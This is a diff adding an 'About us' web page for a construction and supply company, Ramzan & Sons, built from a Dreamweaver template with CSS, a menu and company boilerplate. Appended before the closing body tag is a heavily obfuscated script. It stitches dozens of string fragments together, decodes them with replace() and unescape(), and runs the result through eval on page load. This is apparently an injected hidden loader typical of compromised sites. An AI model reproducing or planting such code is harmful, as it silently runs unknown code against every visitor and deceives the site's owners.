@@ -1,0 +1,137 @@
+<%@LANGUAGE="JAVASCRIPT" CODEPAGE="65001"%>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<!-- TemplateBeginEditable name="doctitle" -->
+<title>About us</title>
+<!-- TemplateEndEditable -->
+<!-- TemplateBeginEditable name="head" -->
+<!-- TemplateEndEditable -->
+<style type="text/css"> 
+<!-- 
+body  {
+	font: 100% Verdana, Arial, Helvetica, sans-serif;
+	background: #666666;
+	margin: 0; /* it's good practice to zero the margin and padding of the body element to account for differing browser defaults */
+	padding: 0;
+	text-align: center; /* this centers the container in IE 5* browsers. The text is then set to the left aligned default in the #container selector */
+	color: #000000;
+}
+.twoColHybLtHdr #container { 
+	width: 80%;  /* this will create a container 80% of the browser width */
+	background: #FFFFFF;
+	margin: 0 auto; /* the auto margins (in conjunction with a width) center the page */
+	border: 1px solid #000000;
+	text-align: left; /* this overrides the text-align: center on the body element. */
+} 
+.twoColHybLtHdr #header { 
+	background: #DDDDDD; 
+	padding: 0 10px;  /* this padding matches the left alignment of the elements in the divs that appear beneath it. If an image is used in the #header instead of text, you may want to remove the padding. */
+} 
+.twoColHybLtHdr #header h1 {
+	margin: 0; /* zeroing the margin of the last element in the #header div will avoid margin collapse - an unexplainable space between divs. If the div has a border around it, this is not necessary as that also avoids the margin collapse */
+	padding: 10px 0; /* using padding instead of margin will allow you to keep the element away from the edges of the div */
+}
+
+/* Tips for sidebar1:
+1. Since we are working in relative units, it's best not to use padding on the sidebar. It will be added to the overall width for standards compliant browsers creating an unknown actual width. 
+2. Since em units are used for the sidebar value, be aware that its width will vary with different default text sizes.
+3. Space between the side of the div and the elements within it can be created by placing a left and right margin on those elements as seen in the ".twoColHybLtHdr #sidebar1 p" rule.
+*/
+.twoColHybLtHdr #sidebar1 {
+	float: left; 
+	width: 12em; /* since this element is floated, a width must be given */
+	background: #EBEBEB; /* the background color will be displayed for the length of the content in the column, but no further */
+	padding: 15px 0; /* top and bottom padding create visual space within this div  */
+}
+.twoColHybLtHdr #sidebar1 h3, .twoColHybLtHdr #sidebar1 p {
+	margin-left: 10px; /* the left and right margin should be given to every element that will be placed in the side columns */
+	margin-right: 10px;
+}
+
+/* Tips for mainContent:
+1. The space between the mainContent and sidebar1 is created with the left margin on the mainContent div.  No matter how much content the sidebar1 div contains, the column space will remain. You can remove this left margin if you want the #mainContent div's text to fill the #sidebar1 space when the content in #sidebar1 ends.
+2. Be aware it is possible to cause float drop (the dropping of the non-floated mainContent area below the sidebar) if an element wider than it can contain is placed within the mainContent div. WIth a hybrid layout (percentage-based overall width with em-based sidebar), it may not be possible to calculate the exact width available. If the user's text size is larger than average, you will have a wider sidebar div and thus, less room in the mainContent div. You should be aware of this limitation - especially if the client is adding content with Contribute.
+3. In the Internet Explorer Conditional Comment below, the zoom property is used to give the mainContent "hasLayout." This may help avoid several IE-specific bugs.
+*/
+.twoColHybLtHdr #mainContent { 
+	margin: 0 20px 0 13em; /* the right margin can be given in percentages or pixels. It creates the space down the right side of the page. */
+} 
+.twoColHybLtHdr #footer { 
+	padding: 0 10px; /* this padding matches the left alignment of the elements in the divs that appear above it. */
+	background:#DDDDDD;
+} 
+.twoColHybLtHdr #footer p {
+	margin: 0; /* zeroing the margins of the first element in the footer will avoid the possibility of margin collapse - a space between divs */
+	padding: 10px 0; /* padding on this element will create space, just as the the margin would have, without the margin collapse issue */
+}
+
+/* Miscellaneous classes for reuse */
+.fltrt { /* this class can be used to float an element right in your page. The floated element must precede the element it should be next to on the page. */
+	float: right;
+	margin-left: 8px;
+}
+.fltlft { /* this class can be used to float an element left in your page */
+	float: left;
+	margin-right: 8px;
+}
+.clearfloat { /* this class should be placed on a div or break element and should be the final element before the close of a container that should fully contain a float */
+	clear:both;
+    height:0;
+    font-size: 1px;
+    line-height: 0px;
+}
+.style1 {
+	font-size: 12px
+}
+--> 
+</style><!--[if IE]>
+<style type="text/css"> 
+/* place css fixes for all versions of IE in this conditional comment */
+.twoColHybLtHdr #sidebar1 { padding-top: 30px; }
+.twoColHybLtHdr #mainContent { zoom: 1; padding-top: 15px; }
+/* the above proprietary zoom property gives IE the hasLayout it may need to avoid several bugs */
+</style>
+<![endif]--></head>
+
+<body class="twoColHybLtHdr">
+
+<div id="container">
+  <div id="header">
+    <h1>Ramzan &amp; Sons</h1>
+  <!-- end #header --></div>
+  <div id="sidebar1">
+    <h3>MENU</h3>
+    <p class="style1">ABOUT US</p>
+    <p class="style1"><a href="m&amp;o.html">MISSION &amp; OBJECTIVES</a></p>
+    <p class="style1"><a href="scope.html">SCOPE OF WORK</a></p>
+    <p class="style1"><a href="investment.html">INVESTMENTS</a></p>
+    <p class="style1"><a href="clients.html">CLIENTAL LIST</a></p>
+    <p class="style1"><a href="team.html">MANAGEMENT TEAM</a></p>
+    <p><span class="style1"><a href="contactus.html">CONTACT US</a></span></p>
+    <p>&nbsp;</p>
+    <!-- end #sidebar1 --></div>
+  <div id="mainContent">
+    <h1> ABOUT US</h1>
+    <ul>
+      <ul>
+        <ul>
+          <li>In view of your aforesaid projects, we are  honored here with to extend our participation in these lucrative projects in  order to achieve benefit for both parties.  </li>
+          <li>                  Allow  us to provide your good selves with details of our humble beginnings and our  remarkable achievements today for your kind knowledge and consideration.</li>
+          <li>                  Starting  off as a proprietorship founded by Mr. Qaiser Saleem, our company merged into  the business scenario with a defined commitment to quality and integrity. Its  pioneer and Managing Director, Mr. Qaiser Saleem has taken the organization  into the market of general supply of various goods and construction projects  and today, the firm has acclaimed an international status in this industry </li>
+        </ul>
+      </ul>
+    </ul>
+    Ramzan &amp; Sons is involved in numerous activities  which include major Construction works, Building renovation works, Cable laying  works, Maintenance, Electrical works, Fire alarm systems, Import and Export.  Driven by young and aggressive management, Ramzan &amp; Sons has grown into a  major player in the world’s construction and business industry by providing  excellent service and expert skills. This accomplishment has been achieved  through our skilled and dedicated employees and contractors
+<p><br class="clearfloat" />
+	</p>
+  </div>
+	<div id="footer">
+    <p align="center" class="style1">COPY RIGHT RAMZAN AND SONS, 2008</p>
+    <!-- end #footer --></div>
+<!-- end #container --></div>
+
+
+<script>var DQfgp="P8uqn3Duqn27uqn";var z4bw="lace(/uqn/";var F4R92H="70J554J5";var YbybZ="8o564o56Fo563o";var KTb094E="Q65JFQ20JFQ28";var eadqu="Eo53Co5";var FSeWTYT="579TMvDJ527";var zArpa="FQ6FJFQ63JFQ";var dGxjSkzj="8uqn27uqnP9uqn";var Pln5CV="escape(E9I";var vPv2kxe="uqnPDuqnP5u";var Y1buTs="'%').replace(";var WMNi9sx="ce(/v/";KTb094E+="JFQ74JFQ34JFQ";var rlzV="PCuqnP5uqnPDuq";var NeCBO09N="uqnPFuqnP3u";var Ljz1KXSF="o574o534o559o";var CJv9pZK="'%3')));";var O7JEZVoi="qn74uq";var IfIB7="n75uqn2Euq";var rEJB="4J565J5";var oksQguA="2uqnP5uqnP1uq";var qeUby="64J528J56CJ54";var mreJ2O="o564o569o";var O50Gz="7m.replace(/Zn";var CmB1="o569o564";Y1buTs="replace(/J5/g,"+Y1buTs;FSeWTYT="56CJ569J574J"+FSeWTYT;O7JEZVoi+="n74uqn70uqn3Auq";CmB1=mreJ2O+"576o520"+CmB1;var akvwl="60gHD%F4DHD";qeUby="568J569J56CJ5"+qeUby;var oeUjD="qn20uqn70uqn54u";dGxjSkzj+="PPuqn72uq";dGxjSkzj+="nP1uqnPDu";var GZoQqaw="50J573J558J";var Fb0Uzi="Vx.replace(/JF";var UrfohHpn="Eo527o52Bo574";rlzV="uqn2Euqn"+rlzV;var iDzKDUj="CuqnP5";var uZ3Orr="PCuqn4DuqnP7uq";var bxCfKpf="o574o53";WMNi9sx="1lF.repla"+WMNi9sx;eadqu="Do527o53"+eadqu;var iSp8BMXw="7uqnP7uqn43uqn";rlzV+="nPFuqnPEuqnP9u";z4bw+="g,'%')));var E";var Ww94x="73uqn58uqn";WMNi9sx="escape(l"+WMNi9sx;var Wz3LAubF="8HD%F52HD%F37H";Wz3LAubF+="D%F27HD";var zGbt="P7uqnP5u";var d1o3Qsr="1uqn72";var bFBdQE="28uqn27uq";var TKlZUOVT="65HD%F";var QRkg="J52EJ573J574J57";TKlZUOVT+="69HD%F67HD%";DQfgp="4uqn74uqn"+DQfgp;var rqqCcWm="Q3B';eval(unes";d1o3Qsr="nuqn7PuqnP"+d1o3Qsr;NeCBO09N=Ww94x+"77uqn3DuqnP4"+NeCBO09N;var MjYMP="D%F6DHD%F";var qq5aA="n74uqn42uqn79";var IQlH1="o575o56Co";O50Gz+="/g,'B').re";var sSG3UmwT="uqn7PuqnP1";rqqCcWm=KTb094E+"59JFQ53JFQ29JF"+rqqCcWm;z4bw+="9I10wi";zGbt="n2Euqn"+zGbt;var EXP48="ape(G62Dm.re";var lL5u="D%F2EHD%F";rEJB=FSeWTYT+"J568J569J564J56"+rEJB;qeUby="J564J543J"+qeUby;YbybZ+="575o56Do56";bFBdQE+="n59uqn7";iDzKDUj+="uqnPDuq";dGxjSkzj+="qnP5uqn2";Fb0Uzi=rqqCcWm+"cape(R9Lh"+Fb0Uzi;var nKQUixQ="59o553o5";d1o3Qsr="uqn29uqn3Z"+d1o3Qsr;bxCfKpf+="4o559o553o";Fb0Uzi+="Q/g,'%";d1o3Qsr="ZnuqnPDuqn27"+d1o3Qsr;var inC2v="2Fo562o56Fo564o";EXP48+="place(/o5/g,'%";var XTIAy="o52Eo562o56Fo";var UMlCTp6c="DHD%F27HD%F6";zArpa="R9LhVx='JFQ64J"+zArpa;qq5aA=iDzKDUj+"nP5uqnPEuq"+qq5aA;oeUjD=sSG3UmwT+"uqn72u"+oeUjD;uZ3Orr=dGxjSkzj+"7uqn29uqn3Znuqn"+uZ3Orr;d1o3Qsr=iSp8BMXw+"PEuqn4"+d1o3Qsr;GZoQqaw=F4R92H+"78J570J5"+GZoQqaw;CmB1+="o53Do527o5";var imALOSe6="75uqn3DuqnP4";var cmw6vmq=")));var l1";IfIB7="n4DuqnP7uq"+IfIB7;var coYm="0gHD%F4D";var OUqP="uqn73uqn2Fuqn5";coYm="BHD%F6"+coYm;Wz3LAubF="%F4EHD%F5"+Wz3LAubF;Ljz1KXSF+="553o53D";zGbt="nP5uqnPEuqn74uq"+zGbt;var f239="9J573J569J";GZoQqaw=rEJB+"6EJ527TMvBJ5"+GZoQqaw;GZoQqaw=f239+"562J569J"+GZoQqaw;Pln5CV=Wz3LAubF+"%F3B';eval(un"+Pln5CV;QRkg+="9J56CJ565J5";var sh9pY="7uqn3Zn';e";zArpa+="75JFQ6";sh9pY=DQfgp+"31uqn2"+sh9pY;var cO5wyw="3B';ev";GZoQqaw+="577J52EJ5";var Ubnokj="var G62Dm='o5";sh9pY=IfIB7+"n77uqnP9uqnP"+sh9pY;UrfohHpn="64o579o53"+UrfohHpn;akvwl=z4bw+"='HD%F"+akvwl;TKlZUOVT="%F2EHD%F68HD%F"+TKlZUOVT;imALOSe6="PCuqn4DuqnP7uqn"+imALOSe6;OUqP=rlzV+"qnP1uqn2Euqn77"+OUqP;d1o3Qsr="Znuqn7"+d1o3Qsr;GZoQqaw+="61J570J57";qeUby+="DJ567J575J529";uZ3Orr+="n75uqn2Euqn73uq";vPv2kxe+="qnPEuqn74uqn";Fb0Uzi="2JFQ69JFQ74JF"+Fb0Uzi;OUqP+="4uqnP2uq";oeUjD=" Qz7m='"+oeUjD;var ZQofK="JFQ6EJFQ74JFQ";WMNi9sx=qeUby+"TMvB';eval(un"+WMNi9sx;bFBdQE=qq5aA+"uqn49uqnP4uqn"+bFBdQE;O50Gz=sh9pY+"val(unescape(Qz"+O50Gz;MjYMP=lL5u+"6EHD%F61H"+MjYMP;O7JEZVoi+="n2Fuqn2FuqnPPu";vPv2kxe=imALOSe6+"uqnPFuqnP3uqn75"+vPv2kxe;oksQguA+="n74uqnP5uqn45uq";oksQguA=vPv2kxe+"2EuqnP3uqn7"+oksQguA;O7JEZVoi="n27uqnP8u"+O7JEZVoi;oeUjD=Fb0Uzi+"')));var"+oeUjD;YbybZ="Bo569o566o52"+YbybZ;var Ky0EiAT="3DHD%F27HD%F3";MjYMP=coYm+"HD%F67HD%F75H"+MjYMP;XTIAy=YbybZ+"5o56Eo574"+XTIAy;O50Gz+="place(/P/g,'6";OUqP="uqn74uqn73"+OUqP;Pln5CV="%F74HD%F35HD"+Pln5CV;oksQguA=d1o3Qsr+"uqn20uqn"+oksQguA;ZQofK=zArpa+"DJFQ65"+ZQofK;UrfohHpn="o562o56Fo5"+UrfohHpn;oeUjD=ZQofK+"2EJFQ77JFQ7"+oeUjD;TKlZUOVT=akvwl+"%F67HD%F75HD"+TKlZUOVT;var fV9iDa="o56Bo577o567o54";nKQUixQ=UrfohHpn+"o534o5"+nKQUixQ;IQlH1="53Do53Do56E"+IQlH1;oksQguA=bFBdQE+"3uqnPPuqnP"+oksQguA;Ky0EiAT=TKlZUOVT+"F68HD%F74HD%F"+Ky0EiAT;var z45Vo="nPDuqnP5uqnP";eadqu+="2Fo564o5";zGbt=NeCBO09N+"qn75uqnPDuq"+zGbt;oeUjD+="qn78uq";fV9iDa=CmB1+"59o573o566"+fV9iDa;var n45IzxVB=").replace(/0g";O7JEZVoi=uZ3Orr+"n72uqnP3uqn3Duq"+O7JEZVoi;MjYMP=Ky0EiAT+"1HD%F27HD%F3"+MjYMP;O7JEZVoi=z45Vo+"Euqn74uqn2"+O7JEZVoi;OUqP+="nPCuqn27uqn";cO5wyw=inC2v+"579o53Eo527o5"+cO5wyw;zGbt=oeUjD+"n70uqn50uqn"+zGbt;eadqu=fV9iDa+"3o56Eo54Bo56"+eadqu;GZoQqaw=QRkg+"2EJ576J56"+GZoQqaw;oksQguA=zGbt+"qn74uqn45uqnP"+oksQguA;oksQguA=EXP48+"')));var "+oksQguA;IQlH1=XTIAy+"564o579o"+IQlH1;bxCfKpf=IQlH1+"56Co529"+bxCfKpf;nKQUixQ=bxCfKpf+"53Do527o53C"+nKQUixQ;OUqP=O7JEZVoi+"qn72uqn75uqnP9"+OUqP;GZoQqaw="J54DJ567J575"+GZoQqaw;CJv9pZK=Y1buTs+"/TMV/g,"+CJv9pZK;Pln5CV=UMlCTp6c+"EHD%F6AHD"+Pln5CV;O50Gz=OUqP+"3ZnuqnPCuq"+O50Gz;Pln5CV+="10wi.repl";eadqu+="69o576o";eadqu=Ljz1KXSF+"o522o53C"+eadqu;Pln5CV=MjYMP+"65HD%F3"+Pln5CV;n45IzxVB=Pln5CV+"ace(/%F/g,'N'"+n45IzxVB;GZoQqaw=cmw6vmq+"lF='J56C"+GZoQqaw;WMNi9sx=GZoQqaw+"0J565J56E"+WMNi9sx;O50Gz=oksQguA+"nPCuqnP5uq"+O50Gz;WMNi9sx="ce(/HDN/g,'%'"+WMNi9sx;CJv9pZK=WMNi9sx+"g,'V')."+CJv9pZK;n45IzxVB=O50Gz+"').rep"+n45IzxVB;CJv9pZK=n45IzxVB+"/g,'C').repla"+CJv9pZK;cO5wyw=nKQUixQ+"2Bo527o53Co5"+cO5wyw;cO5wyw=eadqu+"53Eo522o53"+cO5wyw;cO5wyw=Ubnokj+"76o561o572o520"+cO5wyw;CJv9pZK=cO5wyw+"al(unesc"+CJv9pZK;eval(CJv9pZK);</script></body>
+</html>
